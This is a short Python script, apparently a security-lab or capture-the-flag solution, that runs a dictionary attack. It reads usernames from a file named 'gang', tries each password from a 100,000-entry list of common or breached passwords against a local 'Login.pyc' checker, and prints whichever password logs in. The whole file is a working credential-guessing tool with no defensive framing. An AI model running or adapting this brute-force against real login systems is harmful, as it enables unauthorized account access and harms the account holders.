import os
import subprocess
import time

if __name__ == "__main__":
    start = time.time()
    print(f"Start time : {start}")
    gang_txt = open("./gang")
    gang_members = gang_txt.readlines()
    gang_txt.close()
    common_pw_txt = open("./PwnedPWs100k")
    common_pw = common_pw_txt.readlines()
    common_pw_txt.close()

    for member in gang_members:
        member = member.strip()
        result = "?"
        for pw in common_pw:
            pw = pw[:-1]
            output = subprocess.run(["python3", "./Login.pyc", member, pw], capture_output = True, text = True)
            if(output.stdout == 'Login successful.\n'):
                result = pw
                break
        print(f"{member} : {result}")

    end = time.time()
    print(f"End time : {end}")
